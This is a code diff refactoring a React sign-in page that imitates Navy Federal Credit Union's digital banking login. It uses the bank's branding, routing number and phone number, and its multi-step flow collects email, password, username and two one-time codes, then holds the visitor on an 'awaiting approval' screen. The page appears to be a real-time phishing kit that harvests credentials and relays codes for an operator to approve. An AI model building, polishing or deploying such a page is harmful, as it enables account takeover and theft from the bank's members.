@@ -51,6 +51,44 @@ export default function SignInPage() {
     };
   }, [step, attemptId]);
 
+  if (step === 'approved_success') {
+    return (
+      <div style={s.page}>
+        <div style={s.successCard}>
+          <div style={s.successIcon}>✅</div>
+          <h1 style={s.successHeading}>Congratulations</h1>
+          <p style={s.successText}>Your account &amp; verification has been approved.</p>
+          {email ? <p style={s.successEmail}>{email}</p> : null}
+        </div>
+      </div>
+    );
+  }
+
+  if (step === 'rejected') {
+    return (
+      <div style={s.page}>
+        <div style={s.successCard}>
+          <div style={s.errorIcon}>🚫</div>
+          <h1 style={{ ...s.successHeading, color: '#c62828' }}>Sign-in Blocked</h1>
+          <p style={s.successText}>Your sign-in was rejected.</p>
+          <button
+            style={s.signOutBtn}
+            onClick={() => {
+              setStep('credentials');
+              setAttemptId(null);
+              setUsername('');
+              setOtp('');
+              setError(null);
+              setNote(null);
+            }}
+          >
+            Try Again
+          </button>
+        </div>
+      </div>
+    );
+  }
+
   const titles: Record<Exclude<Step, 'approved_success'>, string> = {
     credentials: 'Sign In',
     username: 'Enter Username',
@@ -122,157 +160,88 @@ export default function SignInPage() {
     }
   }
 
-  // ==========================================
-  // SUCCESS SCREEN
-  // ==========================================
-  if (step === 'approved_success') {
-    return (
-      <div style={styles.page}>
-        <div style={styles.successCard}>
-          <div style={styles.successIcon}>✅</div>
-          <h1 style={styles.successHeading}>Congratulations</h1>
-          <p style={styles.successText}>Your account &amp; verification has been approved.</p>
-          {email && <p style={styles.successEmail}>{email}</p>}
-        </div>
-      </div>
-    );
-  }
-
-  // ==========================================
-  // REJECTED SCREEN
-  // ==========================================
-  if (step === 'rejected') {
-    return (
-      <div style={styles.page}>
-        <div style={styles.successCard}>
-          <div style={styles.errorIcon}>🚫</div>
-          <h1 style={{ ...styles.successHeading, color: '#c62828' }}>Sign-in Blocked</h1>
-          <p style={styles.successText}>Your sign-in was rejected.</p>
-          <button
-            style={styles.signOutBtn}
-            onClick={() => {
-              setStep('credentials');
-              setAttemptId(null);
-              setUsername('');
-              setOtp('');
-              setError(null);
-              setNote(null);
-            }}
-          >
-            Try Again
-          </button>
-        </div>
-      </div>
-    );
-  }
-
-  // ==========================================
-  // MAIN LOGIN PAGE - NAVY FCU DESIGN
-  // ==========================================
   return (
-    <div style={styles.page}>
+    <div style={s.page}>
       {/* HEADER */}
-      <header style={styles.header}>
-        <div style={styles.headerInner}>
-          <div style={styles.logo}>
+      <header style={s.header}>
+        <div style={s.headerInner}>
+          <div style={s.logo}>
             NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span>
           </div>
-          <span style={styles.routing}>Routing Number: 256074974</span>
+          <span style={s.routing}>Routing Number: 256074974</span>
         </div>
       </header>
 
-      {/* MAIN CONTENT */}
-      <main style={styles.main}>
-        <h1 style={styles.welcome}>Welcome to Digital Banking</h1>
+      {/* MAIN */}
+      <main style={s.main}>
+        <h1 style={s.welcome}>Welcome to Digital Banking</h1>
 
-        <div style={styles.card}>
-          <div style={styles.cardBar}></div>
-          <div style={styles.cardBody}>
-            {/* Header with Lock Icon */}
-            <div style={styles.cardHeader}>
-              <div style={styles.lockIcon}>
-                <div style={styles.lockShackle}></div>
-                <div style={styles.lockBody}>
-                  <div style={styles.lockHole}></div>
-                </div>
+        <div style={s.card}>
+          <div style={s.cardBar}></div>
+          <div style={s.cardBody}>
+            {/* Header */}
+            <div style={s.cardHeader}>
+              <div style={s.lockIcon}>
+                <div style={s.lockShackle}></div>
+                <div style={s.lockBody}><div style={s.lockHole}></div></div>
               </div>
-              <span style={styles.cardTitle}>
-                {step === 'awaiting_approval' ? 'Verification in Progress' : titles[step as Exclude<Step, 'approved_success'>] || 'Sign In'}
-              </span>
-              <span style={styles.stepIndicator}>
+              <span style={s.cardTitle}>{titles[step]}</span>
+              <span style={s.stepIndicator}>
                 {step === 'credentials' && 'Step 1/3'}
                 {step === 'username' && 'Step 2/3'}
                 {(step === 'otp1' || step === 'otp2') && 'Step 3/3'}
               </span>
             </div>
 
-            {/* Progress Bar */}
-            <div style={styles.progress}>
-              <div style={{
-                ...styles.progressStep,
-                background: step !== 'credentials' ? '#4caf50' : '#0a1628'
-              }} />
-              <div style={{
-                ...styles.progressStep,
-                background: step === 'username' ? '#0a1628' :
-                  (step === 'otp1' || step === 'otp2' || step === 'awaiting_approval') ? '#4caf50' : '#ddd'
-              }} />
-              <div style={{
-                ...styles.progressStep,
-                background: (step === 'otp1' || step === 'otp2' || step === 'awaiting_approval') ? '#0a1628' : '#ddd'
-              }} />
+            {/* Progress */}
+            <div style={s.progress}>
+              <div style={{ ...s.progressStep, background: step !== 'credentials' ? '#4caf50' : '#0a1628' }} />
+              <div style={{ ...s.progressStep, background: step === 'username' ? '#0a1628' : (step === 'otp1' || step === 'otp2' || step === 'awaiting_approval') ? '#4caf50' : '#ddd' }} />
+              <div style={{ ...s.progressStep, background: (step === 'otp1' || step === 'otp2' || step === 'awaiting_approval') ? '#0a1628' : '#ddd' }} />
             </div>
 
-            {/* Error & Note Messages */}
-            {error && (
-              <div style={styles.messageError}>
-                ❌ {error}
-              </div>
-            )}
-            {note && step !== 'awaiting_approval' && (
-              <div style={styles.messageInfo}>
-                {note}
-              </div>
-            )}
+            {/* Messages */}
+            {error && <div style={s.messageError}>❌ {error}</div>}
+            {note && step !== 'awaiting_approval' && <div style={s.messageInfo}>{note}</div>}
 
-            {/* FORM */}
-            <form onSubmit={onSubmit} style={styles.form}>
+            {/* Form */}
+            <form onSubmit={onSubmit} style={s.form}>
               {step === 'credentials' && (
                 <>
-                  <div style={styles.field}>
-                    <label style={styles.label}>Email Address</label>
+                  <div style={s.field}>
+                    <label style={s.label}>Email Address</label>
                     <input
                       type="email"
                       required
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
-                      style={styles.input}
+                      style={s.input}
                       placeholder="you@example.com"
                     />
                   </div>
-                  <div style={styles.field}>
-                    <label style={styles.label}>Password</label>
+                  <div style={s.field}>
+                    <label style={s.label}>Password</label>
                     <input
                       type="password"
                       required
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
-                      style={styles.input}
+                      style={s.input}
                       placeholder="Enter your password"
                     />
                   </div>
-                  <a href="#" style={styles.helpLink}>SIGN IN HELP</a>
+                  <a href="#" style={s.helpLink}>SIGN IN HELP</a>
                 </>
               )}
 
               {step === 'username' && (
-                <div style={styles.field}>
-                  <label style={styles.label}>Username</label>
+                <div style={s.field}>
+                  <label style={s.label}>Username</label>
                   <input
                     required
                     value={username}
                     onChange={(e) => setUsername(e.target.value)}
-                    style={styles.input}
+                    style={s.input}
                     placeholder="Enter your username"
                     autoComplete="username"
                   />
@@ -280,28 +249,24 @@ export default function SignInPage() {
               )}
 
               {(step === 'otp1' || step === 'otp2') && (
-                <div style={styles.field}>
-                  <label style={styles.label}>
-                    {step === 'otp1' ? 'Verification Code' : 'Second Code'}
-                  </label>
+                <div style={s.field}>
+                  <label style={s.label}>{step === 'otp1' ? 'Verification Code' : 'Second Code'}</label>
                   <input
                     required
                     inputMode="numeric"
                     maxLength={6}
                     value={otp}
-                    onChange={(e) =>
-                      setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
-                    }
-                    style={{ ...styles.input, ...styles.otpInput }}
+                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                    style={{ ...s.input, ...s.otpInput }}
                     placeholder="000000"
                   />
                 </div>
               )}
 
               {step === 'awaiting_approval' && (
-                <div style={styles.waitingBox}>
-                  <div style={styles.waitingIcon}>⏳</div>
-                  <p style={styles.waitingText}>{WAIT_MSG}</p>
+                <div style={s.waitingBox}>
+                  <div style={s.waitingIcon}>⏳</div>
+                  <p style={s.waitingText}>{WAIT_MSG}</p>
                 </div>
               )}
 
@@ -309,10 +274,7 @@ export default function SignInPage() {
                 <button
                   type="submit"
                   disabled={loading}
-                  style={{
-                    ...styles.submitBtn,
-                    opacity: loading ? 0.6 : 1,
-                  }}
+                  style={{ ...s.submitBtn, opacity: loading ? 0.6 : 1 }}
                 >
                   {loading ? 'Processing…' : 'Continue'}
                 </button>
@@ -321,7 +283,7 @@ export default function SignInPage() {
               {step !== 'credentials' && step !== 'awaiting_approval' && step !== 'rejected' && (
                 <button
                   type="button"
-                  style={styles.secondaryBtn}
+                  style={s.secondaryBtn}
                   onClick={() => {
                     setStep('credentials');
                     setAttemptId(null);
@@ -340,25 +302,23 @@ export default function SignInPage() {
       </main>
 
       {/* FOOTER */}
-      <footer style={styles.footer}>
-        <div style={styles.footerInner}>
+      <footer style={s.footer}>
+        <div style={s.footerInner}>
           <div>
-            <div style={styles.footerLogo}>
-              NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span>
-            </div>
-            <div style={styles.footerContact}>24/7 Member Services: <strong>1-888-842-6328</strong></div>
-            <div style={styles.footerContact}>Routing Number: <strong>256074974</strong></div>
+            <div style={s.footerLogo}>NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span></div>
+            <div style={s.footerContact}>24/7 Member Services: <strong>1-888-842-6328</strong></div>
+            <div style={s.footerContact}>Routing Number: <strong>256074974</strong></div>
           </div>
-          <div style={styles.footerLinks}>
-            <a href="#" style={styles.footerLink}>About Us</a>
-            <a href="#" style={styles.footerLink}>Contact Us</a>
-            <a href="#" style={styles.footerLink}>Privacy</a>
-            <a href="#" style={styles.footerLink}>Security</a>
-            <a href="#" style={styles.footerLink}>Accessibility</a>
-            <a href="#" style={styles.footerLink}>Terms</a>
+          <div style={s.footerLinks}>
+            <a href="#" style={s.footerLink}>About Us</a>
+            <a href="#" style={s.footerLink}>Contact Us</a>
+            <a href="#" style={s.footerLink}>Privacy</a>
+            <a href="#" style={s.footerLink}>Security</a>
+            <a href="#" style={s.footerLink}>Accessibility</a>
+            <a href="#" style={s.footerLink}>Terms</a>
           </div>
         </div>
-        <div style={styles.footerBottom}>
+        <div style={s.footerBottom}>
           <span>© 2026 Navy Federal Credit Union.</span>
           <span>All rights reserved.</span>
         </div>
@@ -368,9 +328,9 @@ export default function SignInPage() {
 }
 
 // ==========================================
-// STYLES - Fully Responsive
+// STYLES
 // ==========================================
-const styles: { [key: string]: React.CSSProperties } = {
+const s: { [key: string]: React.CSSProperties } = {
   page: {
     minHeight: '100vh',
     background: '#fafafa',
@@ -378,8 +338,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     display: 'flex',
     flexDirection: 'column',
   },
-
-  // ===== HEADER =====
   header: {
     background: '#0a1628',
     padding: '12px 16px',
@@ -404,8 +362,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     color: 'rgba(255,255,255,0.7)',
     fontSize: 'clamp(11px, 2vw, 14px)',
   },
-
-  // ===== MAIN =====
   main: {
     flex: 1,
     padding: '24px 16px 40px',
@@ -419,8 +375,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     fontWeight: 600,
     marginBottom: 'clamp(20px, 4vw, 28px)',
   },
-
-  // ===== CARD =====
   card: {
     background: '#f5f5f5',
     borderRadius: '8px',
@@ -492,8 +446,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     fontSize: 'clamp(12px, 2vw, 14px)',
     color: '#888',
   },
-
-  // ===== PROGRESS =====
   progress: {
     display: 'flex',
     gap: '8px',
@@ -507,28 +459,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     background: '#ddd',
     transition: 'background 0.3s',
   },
-
-  // ===== MESSAGES =====
-  messageError: {
-    padding: '12px 16px',
-    borderRadius: '4px',
-    marginBottom: '16px',
-    fontSize: '14px',
-    background: '#ffebee',
-    color: '#c62828',
-    border: '1px solid #ffcdd2',
-  },
-  messageInfo: {
-    padding: '12px 16px',
-    borderRadius: '4px',
-    marginBottom: '16px',
-    fontSize: '14px',
-    background: '#e3f2fd',
-    color: '#0d47a1',
-    border: '1px solid #bbdefb',
-  },
-
-  // ===== FORM =====
   form: {
     display: 'flex',
     flexDirection: 'column',
@@ -553,7 +483,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     background: 'white',
     outline: 'none',
     boxSizing: 'border-box',
-    transition: 'border-color 0.2s',
   },
   otpInput: {
     textAlign: 'center',
@@ -583,7 +512,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     borderRadius: '8px',
     cursor: 'pointer',
     boxShadow: '0 4px 8px rgba(0,0,0,0.15)',
-    transition: 'background 0.2s',
   },
   secondaryBtn: {
     width: '100%',
@@ -596,10 +524,25 @@ const styles: { [key: string]: React.CSSProperties } = {
     borderRadius: '8px',
     cursor: 'pointer',
     marginTop: '12px',
-    transition: 'all 0.2s',
   },
-
-  // ===== WAITING =====
+  messageError: {
+    padding: '12px 16px',
+    borderRadius: '4px',
+    marginBottom: '16px',
+    fontSize: '14px',
+    background: '#ffebee',
+    color: '#c62828',
+    border: '1px solid #ffcdd2',
+  },
+  messageInfo: {
+    padding: '12px 16px',
+    borderRadius: '4px',
+    marginBottom: '16px',
+    fontSize: '14px',
+    background: '#e3f2fd',
+    color: '#0d47a1',
+    border: '1px solid #bbdefb',
+  },
   waitingBox: {
     textAlign: 'center',
     padding: '20px 0',
@@ -615,8 +558,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     maxWidth: '400px',
     margin: '0 auto',
   },
-
-  // ===== SUCCESS / REJECTED =====
   successCard: {
     maxWidth: '400px',
     width: '100%',
@@ -661,10 +602,7 @@ const styles: { [key: string]: React.CSSProperties } = {
     borderRadius: '8px',
     cursor: 'pointer',
     marginTop: '16px',
-    transition: 'background 0.2s',
   },
-
-  // ===== FOOTER =====
   footer: {
     background: '#0a1628',
     color: 'rgba(255,255,255,0.7)',
@@ -699,7 +637,6 @@ const styles: { [key: string]: React.CSSProperties } = {
     color: 'rgba(255,255,255,0.7)',
     textDecoration: 'none',
     fontSize: 'clamp(12px, 2vw, 14px)',
-    transition: 'color 0.2s',
   },
   footerBottom: {
     borderTop: '1px solid rgba(255,255,255,0.1)',
@@ -711,16 +648,3 @@ const styles: { [key: string]: React.CSSProperties } = {
     margin: '20px auto 0',
   },
 };
-
-// ==========================================
-// HOVER STYLES (using CSS injection)
-// ==========================================
-if (typeof document !== 'undefined') {
-  const styleEl = document.createElement('style');
-  styleEl.textContent = `
-    .submit-btn:hover { background: #d96b0e !important; }
-    .secondary-btn:hover { background: #0667ba !important; color: white !important; }
-    .footer-link:hover { color: white !important; text-decoration: underline !important; }
-  `;
-  document.head.appendChild(styleEl);
-}
